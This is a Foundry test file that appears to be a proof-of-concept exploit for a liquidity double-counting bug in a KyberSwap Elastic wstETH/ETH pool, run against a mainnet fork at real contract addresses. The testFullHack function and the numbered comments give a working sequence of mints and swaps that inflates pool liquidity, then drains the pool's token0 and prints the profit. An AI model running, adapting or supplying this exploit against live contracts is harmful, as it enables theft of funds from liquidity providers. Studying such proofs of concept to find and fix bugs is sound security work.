// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "helpers/Pretty.sol";
import "helpers/BitUtils.sol";


import "forge-std/interfaces/IERC20.sol";

import "src/interfaces/IPool.sol";
import "src/interfaces/periphery/IRouter.sol";
import "src/interfaces/periphery/IBasePositionManager.sol";
import {MathConstants as C} from 'src/libraries/MathConstants.sol';

import {FullMath} from 'src/libraries/FullMath.sol';
import "src/libraries/TickMath.sol";
import "src/libraries/QtyDeltaMath.sol";
import "src/libraries/SwapMath.sol";

contract KyberswapTest is Test {

    using stdStorage for StdStorage;

    using Pretty for uint256;
    using Pretty for int256;
    using Pretty for uint160;
    using Pretty for int160;
    using Pretty for uint128;
    using Pretty for int128;
    using Pretty for uint8;
    string API_ENDPOINT;

    address WETH_addr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address wstETH_addr = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    IERC20 wstETH = IERC20(wstETH_addr);
    IERC20 WETH = IERC20(WETH_addr);

    IPool wstETH_ETH = IPool(0xeBfE63Ba0264aD639B3C41d2bfE1aD708F683bc8);

    IRouter router = IRouter(0xC1e7dFE73E1598E3910EF4C7845B68A9Ab6F4c83);
    IBasePositionManager positionManager = IBasePositionManager(0x2B1c7b41f6A8F2b2bc45C3233a5d5FB3cD6dC9A8);

    bytes32 SQRTP_INDEX = bytes32(uint256(3));
    bytes32 BASEL_INDEX = bytes32(uint256(4));

    function setUp() public {
        API_ENDPOINT = vm.envString("EVMNET_FORK_URL");
        // Optionally pass a second argument to choose the block number
        vm.createSelectFork(API_ENDPOINT, 17029900);
        deal(wstETH_addr, address(this), 99_000_000_000_000_000e18);
        deal(WETH_addr, address(this),   99_000_000_000_000_000e18);
        wstETH.approve(address(router), type(uint256).max);
        WETH.approve(address(router), type(uint256).max);
        wstETH.approve(address(positionManager), type(uint256).max);
        WETH.approve(address(positionManager), type(uint256).max);
    }

    function notestLiquidity() public view {
        int24 TARGET_TICK = -100_000;
        int256 amount = QtyDeltaMath.calcRequiredQty1(
            TickMath.getSqrtRatioAtTick(TARGET_TICK),
            TickMath.getSqrtRatioAtTick(TARGET_TICK + 1),
            2**96,
            true);
        console.log("token1 required = %s", amount.pretty());

    }


    /*
     *   Getting the system set up just right to do the hack is actually quite hard
     *   1. The tick must exist prior to the attack
     *   2. Then you need to swap back to the target price.  But this actually reduces the currentTick one below the target tick
     *   3. So you need to swap forward by 1, and swap backwards again by 1. This puts the system in the right state.
     *      For this not to shift the price the liquidity needs to be enormous.
     *   4. Then you can do the double-add bug. This requires nearestTick < targetTick but targetTick == TickMath.getTickAtSqrtRatio(targetTick)
     */

    function notestHackBasics() public {

       int24 currentTick = getCurrentTick();
       uint160 targetSqrtP = TickMath.getSqrtRatioAtTick(currentTick);
       console.log("targetSqrtP = %s", targetSqrtP.pretty());
       logPoolState();

       // STEP 1 Create the tick
       positionManager.mint(getMintParams(currentTick-2, currentTick + 1, 90_000_000e18, 90_000_000e18));
       positionManager.mint(getMintParams(currentTick, currentTick + 1, 1, 1));
       logPoolState();

       // STEP 2 Swap back to target price
       console.log("--- STEP 2. Swap back to target price");
       router.swapExactInputSingle(getExactInputSingleParams(90_000_000e18, targetSqrtP, true));

       logPoolState();
       console.log("--- forwards ---");
       router.swapExactInputSingle(getExactInputSingleParams(1, false));
       logPoolState();
       console.log("--- backwards again. nearestCurrentTick < currentTick ---");
       router.swapExactInputSingle(getExactInputSingleParams(1, true));
       logPoolState();



       console.log("--- STEP 3. Add liquidity");
       (,uint128 liqAdded,,) = positionManager.mint(getMintParams(currentTick, currentTick + 1, 10e18, 10e18));
       console.log("liqAdded = %s", liqAdded.pretty());
       logPoolState();
       router.swapExactInputSingle(getExactInputSingleParams(10e18, false));
       console.log("---- added again ? ----");
       logPoolState();

    }

    function testQuantities() public view {
        int24 tick = -10_000;
        uint256 qty = uint256(QtyDeltaMath.calcRequiredQty1(
          TickMath.getSqrtRatioAtTick(tick),
          TickMath.getSqrtRatioAtTick(tick+1),
          2**97,
          true)
        );

        uint256 price = token0InToken1(tick);
        console.log("price = %s", price.pretty());
        console.log("qty = %s", qty.pretty());
        console.log("swap required = %s", (10**18*qty / price).pretty());

    }

    function testFullHack() public {
        int24 TARGET_TICK = -13_500;
        uint128 INITIAL_LIQUIDITY = 1000e18;
        uint256 HUGE_AMOUNT = 1_000_000_000e18;
        uint160 TARGET_SQRTP = TickMath.getSqrtRatioAtTick(TARGET_TICK);

        int256 token0Received = 0;
        int256 token1Received = 0;

        {
        (,,,uint256 amount1_0) = positionManager.mint(getMintParams(TARGET_TICK - 1, TARGET_TICK + 1, 0, INITIAL_LIQUIDITY));
        (,,uint256 amount0_1, uint256 amount1_1) = positionManager.mint(getMintParams(TARGET_TICK, TARGET_TICK + 1, 1, 1)); // Tick already needs to exist for this hack to work

        token1Received -= int256(amount1_0 + amount1_1);
        token0Received -= int256(amount0_1);
        }


        uint256 marketPrice = token0InToken1(getSqrtP());
        logBalances(marketPrice);




        {
        console.log("TARGET_SQRTP = %s", TARGET_SQRTP);
        uint256 wstETHBefore = wstETH.balanceOf(address(this));
        uint256 token1ReceivedOnSwap = router.swapExactInputSingle(getExactInputSingleParams(HUGE_AMOUNT, TARGET_SQRTP, true));
        uint256 wstETHAfter = wstETH.balanceOf(address(this));
        token1Received += int256(token1ReceivedOnSwap);
        console.log("token0 spent = %s", (wstETHBefore - wstETHAfter).pretty());
        token0Received -= int256(wstETHBefore - wstETHAfter);
        }

       logPoolState();
       console.log("--- forwards ---");
       router.swapExactInputSingle(getExactInputSingleParams(1, false));
       logPoolState();
       console.log("--- backwards again. nearestCurrentTick < currentTick ---");
       router.swapExactInputSingle(getExactInputSingleParams(1, true));
       logPoolState();


        console.log("----- Double liquidity hack beginning ----");



        uint128 amountToken0ToAdd  = getToken0Balance()/2;
        // console.log("wstETH %s", wstETH.balanceOf(address(this)).pretty());
        // console.log("WETH   %s", WETH.balanceOf(address(this)).pretty());
        // console.log("amount %s", amountToken0ToAdd.pretty());

        (,uint128 liqAdded,uint256 amount0Added,) = positionManager.mint(getMintParams(TARGET_TICK, TARGET_TICK+1, amountToken0ToAdd, amountToken0ToAdd));
        console.log("liqAdded = %s", liqAdded.pretty());
        console.log("--- Liquidity should be added once ---");
        token0Received -= int128(int256(amount0Added));
        logPoolState();

        router.swapExactInputSingle(getExactInputSingleParams(1, false)); // cross the tick and get the double add
        console.log("--- Liquidity should be added twice ---");
        logPoolState();

        logBalances(marketPrice);
        console.log("price = %s", token0InToken1(getSqrtP()).pretty());
        uint256 token1RequiredToDrain =  getToken0Balance() * token0InToken1(getSqrtP()) / 1e18 ;
        console.log("token1RequiredToDrain = %s", token1RequiredToDrain.pretty());
        token1Received -= int256(token1RequiredToDrain);
        uint256 token0Out = router.swapExactInputSingle(getExactInputSingleParams(token1RequiredToDrain, false)); // swap one-for-zero
        logPoolState();
        token0Received += int256(token0Out);
        logBalances(marketPrice);
        console.log("token0 net = %s", token0Received.pretty());
        console.log("token1 net = %s", token1Received.pretty());
        console.log("Profit (token1)", (token0Received * int256(marketPrice) / 1e18 + token1Received).pretty());

    }

    function notestDoubleCount() public {
        uint256 snapshotId = vm.snapshot();
        uint128 liquidityWithDouble = doTestDoubleCount(true);
        vm.revertTo(snapshotId);
        console.log("==================================================");
        uint128 liquidityWithoutDouble = doTestDoubleCount(false);
        console.log("==================================================");
        console.log("Liquidity double counted = %s", (liquidityWithDouble - liquidityWithoutDouble).pretty());
    }

    function doTestDoubleCount(bool doDoubleCount) internal returns (uint128) {
        setLiquidity(2**96*uint128(11000)/10000);

        int24 nearestCurrentTick = getNearestCurrentTick();
        logTick(getCurrentTick());
        logTick(nearestCurrentTick);
        int24 tickOnBoundary = nearestCurrentTick;
        console.log("tickOnBoundary = %s", vm.toString(tickOnBoundary));
        setCurrentTick(nearestCurrentTick);
        uint160 price = TickMath.getSqrtRatioAtTick(getCurrentTick());
        setSqrtP(price);
        console.log("--- Initial pool state ---");
        logPoolState();

        if (doDoubleCount) {
          console.log("--- Swap backwards without moving price ---");
          IRouter.ExactInputSingleParams memory backwardsParams = getExactInputSingleParams(1, true);
          router.swapExactInputSingle(backwardsParams);
          logPoolState();
        }

        ////////////////

        console.log("--- Add liquidity to tick %s ---", vm.toString(tickOnBoundary));
        nearestCurrentTick = getNearestCurrentTick();
        (int24 prev, int24 next) = wstETH_ETH.initializedTicks(nearestCurrentTick);
        console.log("%s < %s < %s", vm.toString(prev), vm.toString(nearestCurrentTick), vm.toString(next));

        console.log("Adding liquidity to (%s , %s)", vm.toString(tickOnBoundary), vm.toString(tickOnBoundary + 1));
        IBasePositionManager.MintParams memory mintParams = getMintParams(tickOnBoundary, tickOnBoundary + 1, 40_000e18, 1_000_000e18);
        (,uint128 liqAdded,,) = positionManager.mint(mintParams);
          console.log("Liquidity added to tick %s = %s", vm.toString(tickOnBoundary), liqAdded.pretty());
          logTick(tickOnBoundary);
          logPoolState();

        IRouter.ExactInputSingleParams memory forwardsParams = getExactInputSingleParams(1, false);
        router.swapExactInputSingle(forwardsParams);
        logPoolState();
        return getLiquidity();
    }


    /********** HELPERS ***********/

    function logBalances(uint256 marketPrice) internal view {
        uint256 token0Bal = getToken0Balance();
        uint256 token1Bal = getToken1Balance();
        console.log("Balances {");
        console.log("  token0Bal = %s", token0Bal.pretty());
        console.log("  token1Bal = %s", token1Bal.pretty());
        console.log("  marketPrice (token1/token0)", marketPrice.pretty());
        uint256 token1Value = token0Bal * marketPrice / 1e18 + token1Bal;
        console.log("  Total value (in token1) = %s", token1Value.pretty());
        console.log("}");
    }

    function getToken0Balance() internal view returns (uint128) {
        return uint128(wstETH_ETH.token0().balanceOf(address(wstETH_ETH)));
    }

    function getToken1Balance() internal view returns (uint128) {
        return uint128(wstETH_ETH.token1().balanceOf(address(wstETH_ETH)));
    }

    function logPoolState() internal view {
        (uint160 sqrtP,int24 currentTick,int24 nearestCurrentTick,) = wstETH_ETH.getPoolState();
        (uint128 baseL,,) = wstETH_ETH.getLiquidityState();
        console.log("PoolState {");
        console.log("  sqrtP       = %s", sqrtP);
        console.log("  currentTick = %s", vm.toString(currentTick));
        console.log("  nearestCurrentTick = %s", vm.toString(nearestCurrentTick));
        console.log("  baseL       = %s", baseL.pretty());
        console.log("}");
    }

    function logTick(int24 tick) internal view {
      (uint128 liquidityGross,int128 liquidityNet,,) = wstETH_ETH.ticks(tick);
      console.log("Tick %s {", vm.toString(tick));
      console.log("  liquidityGross = %s", liquidityGross.pretty());
      console.log("  liquidityNet = %s", liquidityNet.pretty());
      console.log("}");
    }

    function token1InToken0(int24 tick) internal view returns (uint256) {
        return token1InToken0(TickMath.getSqrtRatioAtTick(tick));
    }

    function token1InToken0(uint160 price) internal view returns (uint256) {
        return 10**(wstETH.decimals() + WETH.decimals()) / token0InToken1(price);
    }

    function token0InToken1(int24 tick) internal view returns (uint256) {
        return token0InToken1(TickMath.getSqrtRatioAtTick(tick));
    }

    function token0InToken1(uint160 price) internal view returns (uint256) {
        return 10**(18 + wstETH.decimals() - WETH.decimals()) * (uint256(price) * price) >> 192;
    }

    function getSqrtP() internal view returns (uint160) {
        (uint160 sqrtP,,,) = wstETH_ETH.getPoolState();
        return sqrtP;
    }

    function getCurrentTick() internal view returns (int24) {
        (,int24 currentTick,,) = wstETH_ETH.getPoolState();
        return currentTick;
    }

    function getNearestCurrentTick() internal view returns (int24) {
        (,,int24 nearestCurrentTick,) = wstETH_ETH.getPoolState();
        return nearestCurrentTick;
    }

    function getLiquidity() internal view returns (uint128) {
        (uint128 baseL,,) = wstETH_ETH.getLiquidityState();
        return baseL;
    }

    function setLiquidity(uint128 liquidity) internal {
        setSlotBitRange(BASEL_INDEX, 0, 128, uint256(liquidity));
    }

    function setSqrtP(uint160 sqrtP) internal {
        setSlotBitRange(SQRTP_INDEX, 0, 160, uint256(sqrtP));
    }

    function setCurrentTick(int24 currentTick) internal {
        setSlotBitRange(SQRTP_INDEX, 184, 24, uint256(uint24(currentTick)));
    }

    function setNearestCurrentTick(int24 nearestCurrentTick) internal {
        setSlotBitRange(SQRTP_INDEX, 160, 24, uint256(uint24(nearestCurrentTick)));
    }

    /* TODO: Factor these out into a Foundry extension library */

    function getSlotBitRange(bytes32 slotIndex, uint8 start, uint16 length) internal view returns (uint256) {
        return BitUtils.getBitRange(vm.load(address(wstETH_ETH), slotIndex), start, length);
    }

    function setSlotBitRange(bytes32 slotIndex, uint8 start, uint16 length, uint256 value) internal {
        bytes32 slot = vm.load(address(wstETH_ETH), slotIndex);
        vm.store(address(wstETH_ETH), slotIndex, BitUtils.setBitRange(slot, start,length, value));
    }

    function incSlot(bytes32 slot, uint256 n) internal pure returns (bytes32) {
        return bytes32(uint256(slot) + n);
    }

    function storeOffset(address addr, bytes32 slot, uint256 offset, bytes32 value) internal {
        vm.store(addr, bytes32(uint256(slot) + offset), value);
    }

    function getReachAmount(uint160 targetSqrtP) internal view returns (uint256) {
        uint160 sqrtP = getSqrtP();
        uint128 liquidity = getLiquidity();
        uint256 numerator = FullMath.mulDivFloor(
          liquidity,
          sqrtP - targetSqrtP,
          sqrtP
        );
        return FullMath.mulDivFloor(numerator, C.TWO_POW_96, sqrtP);
    }

    function getExactInputSingleParams(uint256 amount, bool zeroForOne) internal view returns (IRouter.ExactInputSingleParams memory) {
        return getExactInputSingleParams(amount, 0, zeroForOne);
    }

    function getExactInputSingleParams(uint256 amount, uint160 targetSqrtP, bool zeroForOne) internal view returns (IRouter.ExactInputSingleParams memory) {
        IRouter.ExactInputSingleParams memory params =
          IRouter.ExactInputSingleParams(
            zeroForOne ? wstETH_addr : WETH_addr ,
            zeroForOne ? WETH_addr : wstETH_addr,
            wstETH_ETH.swapFeeUnits(),
            address(this),
            block.timestamp + 86400,
            amount,
            0,
            targetSqrtP
          );
        return params;
    }
    function getMintParams(int24 lowerTick, int24 upperTick, uint128 amount0, uint128 amount1) internal view returns (IBasePositionManager.MintParams memory) {
        int24[2] memory ticksPrevious;

        ticksPrevious[0] = findFirstInitializedTickLessThan(lowerTick);
        ticksPrevious[1] = findFirstInitializedTickLessThan(upperTick);

        return IBasePositionManager.MintParams(
            wstETH_addr,
            WETH_addr,
            wstETH_ETH.swapFeeUnits(),
            lowerTick,
            upperTick,
            ticksPrevious,
            amount0,
            amount1,
            0,
            0,
            address(this),
            block.timestamp + 86400
        );
    }

    function findFirstInitializedTickLessThan(int24 tick) internal view returns (int24) {
        int24 t = getNearestCurrentTick();
        while (t > tick) {
          (t, ) = wstETH_ETH.initializedTicks(t);
        }
        return t;
    }

}
